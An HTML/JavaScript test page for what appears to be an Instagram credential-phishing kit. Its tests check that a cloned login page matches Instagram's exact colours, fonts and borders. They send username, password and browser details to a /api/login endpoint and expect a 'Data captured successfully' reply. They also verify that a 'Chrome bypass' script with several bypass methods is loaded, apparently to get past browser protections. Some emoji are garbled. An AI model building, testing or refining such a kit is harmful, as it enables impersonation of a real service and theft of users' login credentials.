<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram UI Test</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
        .test-container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        .test-result { margin: 10px 0; padding: 10px; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .warning { background: #fff3cd; color: #856404; }
        .info { background: #d1ecf1; color: #0c5460; }
        .instagram-preview { margin: 20px 0; padding: 20px; border: 2px solid #dbdbdb; border-radius: 8px; background: #fafafa; }
    </style>
</head>
<body>
    <div class="test-container">
        <h1>ğŸ” Instagram UI & Backend Integration Test</h1>
        
        <div id="results"></div>
        
        <div class="instagram-preview">
            <h3>ğŸ“± Instagram UI Preview</h3>
            <iframe src="index.html" width="100%" height="600" style="border: 1px solid #ccc; border-radius: 4px;"></iframe>
        </div>
        
        <button onclick="runAllTests()" style="background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px;">
            ğŸš€ Run All Tests
        </button>
    </div>

    <script>
        function addResult(message, type = 'info') {
            const results = document.getElementById('results');
            const div = document.createElement('div');
            div.className = `test-result ${type}`;
            div.innerHTML = `${new Date().toLocaleTimeString()}: ${message}`;
            results.appendChild(div);
        }
        
        async function testFrontendUI() {
            addResult('ğŸ¨ Testing Frontend UI Elements...', 'info');
            
            // Test if Instagram UI elements exist
            const requiredElements = [
                { id: 'loginForm', name: 'Login Form' },
                { id: 'username', name: 'Username Input' },
                { id: 'password', name: 'Password Input' },
                { id: 'loginBtn', name: 'Login Button' }
            ];
            
            let allFound = true;
            requiredElements.forEach(element => {
                const el = document.getElementById(element.id);
                if (el) {
                    addResult(`âœ… ${element.name} found`, 'success');
                } else {
                    addResult(`âŒ ${element.name} missing`, 'error');
                    allFound = false;
                }
            });
            
            // Test Instagram styling
            const logo = document.querySelector('.logo');
            if (logo && logo.textContent.includes('Instagram')) {
                addResult('âœ… Instagram logo found', 'success');
            } else {
                addResult('âŒ Instagram logo missing or incorrect', 'error');
                allFound = false;
            }
            
            // Test form validation
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');
            
            if (usernameInput && passwordInput && loginBtn) {
                // Test form validation
                usernameInput.value = 'test@example.com';
                passwordInput.value = 'testpassword';
                
                if (!loginBtn.disabled) {
                    addResult('âœ… Form validation working correctly', 'success');
                } else {
                    addResult('âŒ Form validation not working', 'error');
                    allFound = false;
                }
                
                // Clear test values
                usernameInput.value = '';
                passwordInput.value = '';
            }
            
            return allFound;
        }
        
        async function testBackendAPI() {
            addResult('ğŸ”— Testing Backend API Connection...', 'info');
            
            try {
                const response = await fetch('/api/test');
                if (response.ok) {
                    const data = await response.json();
                    addResult(`âœ… API Test Endpoint Working: ${data.message}`, 'success');
                    return true;
                } else {
                    addResult(`âŒ API Test Endpoint Failed: ${response.status}`, 'error');
                    return false;
                }
            } catch (error) {
                addResult(`âŒ API Connection Error: ${error.message}`, 'error');
                return false;
            }
        }
        
        async function testLoginAPI() {
            addResult('ğŸ” Testing Login API...', 'info');
            
            try {
                const testData = {
                    username: 'test@example.com',
                    password: 'testpassword123',
                    timestamp: new Date().toISOString(),
                    userAgent: 'Test Browser',
                    language: 'en-US',
                    platform: 'Test Platform'
                };
                
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(testData)
                });
                
                if (response.ok) {
                    const data = await response.json();
                    if (data.success) {
                        addResult('âœ… Login API Working: Data captured successfully', 'success');
                        return true;
                    } else {
                        addResult(`âŒ Login API Failed: ${data.message}`, 'error');
                        return false;
                    }
                } else {
                    addResult(`âŒ Login API Error: ${response.status}`, 'error');
                    return false;
                }
            } catch (error) {
                addResult(`âŒ Login API Connection Error: ${error.message}`, 'error');
                return false;
            }
        }
        
        async function testInstagramUI() {
            addResult('ğŸ“± Testing Instagram UI Authenticity...', 'info');
            
            // Check for Instagram-like styling
            const styles = window.getComputedStyle(document.body);
            const bodyFont = styles.fontFamily;
            
            if (bodyFont.includes('system-ui') || bodyFont.includes('Segoe UI')) {
                addResult('âœ… Instagram-like font family detected', 'success');
            } else {
                addResult('âŒ Font family not matching Instagram style', 'warning');
            }
            
            // Check for Instagram colors
            const loginBtn = document.getElementById('loginBtn');
            if (loginBtn) {
                const btnStyles = window.getComputedStyle(loginBtn);
                const bgColor = btnStyles.backgroundColor;
                
                if (bgColor.includes('rgb(0, 149, 246)') || bgColor.includes('#0095f6')) {
                    addResult('âœ… Instagram blue color detected on login button', 'success');
                } else {
                    addResult('âŒ Login button color not matching Instagram', 'warning');
                }
            }
            
            // Check for Instagram layout
            const card = document.querySelector('.card');
            if (card) {
                const cardStyles = window.getComputedStyle(card);
                const borderColor = cardStyles.borderColor;
                
                if (borderColor.includes('rgb(219, 219, 219)') || borderColor.includes('#dbdbdb')) {
                    addResult('âœ… Instagram-like card border detected', 'success');
                } else {
                    addResult('âŒ Card border not matching Instagram style', 'warning');
                }
            }
            
            return true;
        }
        
        async function testBypassFeatures() {
            addResult('ğŸš€ Testing Chrome Bypass Features...', 'info');
            
            // Check if bypass script is loaded
            if (typeof ChromeBypass !== 'undefined') {
                addResult('âœ… Chrome bypass script loaded', 'success');
            } else {
                addResult('âŒ Chrome bypass script not loaded', 'error');
            }
            
            // Check for bypass methods
            const bypassMethods = [
                'method1', 'method2', 'method3', 'method4', 'method5'
            ];
            
            bypassMethods.forEach(method => {
                if (typeof window[method] === 'function') {
                    addResult(`âœ… Bypass method ${method} available`, 'success');
                } else {
                    addResult(`âŒ Bypass method ${method} not available`, 'error');
                }
            });
            
            return true;
        }
        
        async function runAllTests() {
            addResult('ğŸš€ Starting comprehensive tests...', 'info');
            
            const tests = [
                { name: 'Frontend UI', fn: testFrontendUI },
                { name: 'Backend API', fn: testBackendAPI },
                { name: 'Login API', fn: testLoginAPI },
                { name: 'Instagram UI', fn: testInstagramUI },
                { name: 'Bypass Features', fn: testBypassFeatures }
            ];
            
            let passedTests = 0;
            
            for (const test of tests) {
                try {
                    const result = await test.fn();
                    if (result) {
                        passedTests++;
                    }
                } catch (error) {
                    addResult(`âŒ ${test.name} test failed: ${error.message}`, 'error');
                }
            }
            
            // Summary
            addResult(`ğŸ“Š Test Summary: ${passedTests}/${tests.length} tests passed`, 
                     passedTests === tests.length ? 'success' : 'warning');
            
            if (passedTests === tests.length) {
                addResult('ğŸ‰ All tests passed! Your Instagram login page is ready!', 'success');
            } else {
                addResult('âš ï¸ Some tests failed. Please check the issues above.', 'warning');
            }
        }
        
        // Auto-run tests on page load
        window.addEventListener('load', () => {
            setTimeout(runAllTests, 1000);
        });
    </script>
</body>
</html>
